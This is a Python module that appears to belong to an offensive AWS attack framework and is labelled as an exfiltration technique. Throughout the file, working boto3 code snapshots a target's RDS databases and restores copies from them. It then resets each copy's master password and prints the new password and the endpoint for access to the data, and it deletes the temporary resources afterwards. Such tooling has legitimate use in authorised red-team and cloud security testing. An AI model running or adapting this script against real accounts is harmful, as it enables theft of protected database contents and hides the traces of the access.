#!/usr/bin/env python3
import datetime

import argparse
from pathlib import Path
import json
import random
import string

from botocore.exceptions import ClientError

technique_info = {
    'controller': 'rds__explore_snapshots',
    'last_updated_by': 'Blackbot, Inc. Sun Sep 20 04:13:33 UTC 2020' ,
    'tactic': 'Exfiltration',
    'tactic_id': ['TA0007'],
    'intent': 'Creates copies of running RDS databases to access protected information',
    'name': 'ADD_NAME_HERE' ,#'description': ''Creates a snapshot of all database instances, restores new database instances from those snapshots, and then changes the master password to allow access to the copied database. After the database has been created, the connection information is given. After interactions with the database are complete, the temporary resources are deleted. If there is an unexpected crash during the module\'s execution, the subsequent run of the module will attempt to clean up any leftover temporary resources.',
    'mid': [],
    'services': ['RDS'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': ['--regions'],
    'ttp_data': ['T1526'],
    'version': '1',
    'aws_namespaces': [],
    'defense_bypassed': [],
}

parser = argparse.ArgumentParser(add_help=False, description=technique_info['name'])
parser.add_argument('--regions', required=False, default=None, help='One or more (comma separated) AWS regions in the format us-east-1. Defaults to all session regions.')

TEMP_FILE = Path(__file__).parent / 'temp.json'
WAIT_CONFIG = {'Delay': 10}

def mark_temp(resource):
    if 'DBInstanceArn' in resource:
        key = 'Instances'
        identifier = resource['DBInstanceArn']
    else:
        key = 'Snapshots'
        identifier = resource['DBSnapshotArn']
    data = read_temp()
    data[key][identifier] = resource
    write_temp(data)


def remove_temp(resource):
    if 'DBInstanceArn' in resource:
        key = 'Instances'
        identifier = resource['DBInstanceArn']
    else:
        key = 'Snapshots'
        identifier = resource['DBSnapshotArn']
    data = read_temp()
    del data[key][identifier]
    write_temp(data)


def read_temp():
    with TEMP_FILE.open('r') as infile:
        data = json.load(infile)
    return data


def write_temp(data):
    with TEMP_FILE.open('w') as outfile:
        json.dump(data, outfile, default=str)


def main(args, awsattack):
    
    if args.regions:
        regions = args.regions.split(',')
    else:
        regions = awsattack.get_regions('rds')
    
    summary_data = {'instances': 0}
    
    for region in regions:
        awsattack.print('Region: {}'.format(region))
        client = awsattack.get_boto3_client('rds', region)
        awsattack.print('  Getting RDS instances...')
        active_instances = get_all_region_instances(client, awsattack.print)
        awsattack.print('  Found {} RDS instance(s)'.format(len(active_instances)))
        for instance in active_instances:
            prompt = '    Target: {} (y/n)? '.format(instance['DBInstanceIdentifier'])
            if awsattack.input(prompt).lower() != 'y':
                continue
            awsattack.print('    Creating temporary snapshot...')
            temp_snapshot = create_snapshot_from_instance(client, instance, awsattack.print)
            if not temp_snapshot:
                awsattack.print('    Failed to create temporary snapshot')
                continue

            awsattack.print('    Restoring temporary instance from snapshot...')
            temp_instance = restore_instance_from_snapshot(client, temp_snapshot, awsattack.print)
            if not temp_instance:
                awsattack.print('    Failed to create temporary instance')
                delete_snapshot(client, temp_snapshot, awsattack.print)
                continue

            process_instance(awsattack, client, temp_instance)

            awsattack.print('    Deleting temporary resources...')
            delete_instance(client, temp_instance, awsattack.print)
            delete_snapshot(client, temp_snapshot, awsattack.print)
            summary_data['instances'] += 1
    if not cleanup(awsattack):
        summary_data['fail'] = 'Failed to delete temporary data.'
    return summary_data


def process_instance(awsattack, client, instance):
    waiter = client.get_waiter('db_instance_available')
    waiter.wait(
        DBInstanceIdentifier=instance['DBInstanceIdentifier'],
        WaiterConfig=WAIT_CONFIG,
    )
    password = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))
    awsattack.print('    Master Password for current instance: {}'.format(password))
    if modify_master_password(client, instance, password, awsattack.print):
        awsattack.print('      Password Change Successful')
    else:
        awsattack.print('      Password Change Failed')

    response = client.describe_db_instances(
        DBInstanceIdentifier=instance['DBInstanceIdentifier']
    )
    endpoint = response['DBInstances'][0]['Endpoint']
    awsattack.print('    Connection Information:')
    awsattack.print('      Address: {}'.format(endpoint['Address']))
    awsattack.print('      Port: {}'.format(endpoint['Port']))

    awsattack.input('    Press enter to process next instance...')


def modify_master_password(client, instance, password, print):
    try:
        client.modify_db_instance(
            DBInstanceIdentifier=instance['DBInstanceIdentifier'],
            MasterUserPassword=password,
        )
        return True
    except ClientError as error:
        print('      ' + error.response['Error']['Code'])
    return False


def restore_instance_from_snapshot(client, snapshot, print):
    waiter = client.get_waiter('db_snapshot_available')
    waiter.wait(
        DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'],
        WaiterConfig=WAIT_CONFIG,
    )
    try:
        response = client.restore_db_instance_from_db_snapshot(
            DBInstanceIdentifier=snapshot['DBSnapshotIdentifier'],
            DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'],
        )
        mark_temp(response['DBInstance'])
        return response['DBInstance']
    except ClientError as error:
        print('      ' + error.response['Error']['Code'])
    return {}


def delete_snapshot(client, snapshot, print):
    waiter = client.get_waiter('db_snapshot_available')
    waiter.wait(
        DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'],
        WaiterConfig=WAIT_CONFIG,
    )
    try:
        response = client.delete_db_snapshot(
            DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier']
        )
        remove_temp(response['DBSnapshot'])
        return True
    except ClientError as error:
        print('      ' + error.response['Error']['Code'])
    return False


def delete_instance(client, instance, print):
    waiter = client.get_waiter('db_instance_available')
    waiter.wait(
        DBInstanceIdentifier=instance['DBInstanceIdentifier'],
        WaiterConfig=WAIT_CONFIG,
    )
    try:
        response = client.delete_db_instance(
            DBInstanceIdentifier=instance['DBInstanceIdentifier'],
            SkipFinalSnapshot=True,
        )
        remove_temp(response['DBInstance'])
    except ClientError as error:
        print('      ' + error.response['Error']['Code'])
        return False
    waiter = client.get_waiter('db_instance_deleted')
    waiter.wait(
        DBInstanceIdentifier=instance['DBInstanceIdentifier'],
        WaiterConfig=WAIT_CONFIG,
    )
    return True


def create_snapshot_from_instance(client, instance, print):
    waiter = client.get_waiter('db_instance_available')
    waiter.wait(
        DBInstanceIdentifier=instance['DBInstanceIdentifier'],
        WaiterConfig=WAIT_CONFIG,
    )
    try:
        response = client.create_db_snapshot(
            DBSnapshotIdentifier=instance['DBInstanceIdentifier'] + '-copy',
            DBInstanceIdentifier=instance['DBInstanceIdentifier'],
        )
        mark_temp(response['DBSnapshot'])
        return response['DBSnapshot']
    except ClientError as error:
        print('      ' + error.response['Error']['Code'])
    return {}


def get_all_region_instances(client, print):
    out = []
    paginator = client.get_paginator('describe_db_instances')
    pages = paginator.paginate()
    try:
        for page in pages:
            out.extend(page['DBInstances'])
        return out
    except ClientError as error:
        print('    ' + error.response['Error']['Code'])
        return []


def summary(data, awsattack_main):
    if 'fail' in data:
        out = data['fail'] + '\n'
    else:
        out = '  No issues cleaning up temporary data\n'
    out += '  {} Copy Instance(s) Launched'.format(data['instances'])
    return out
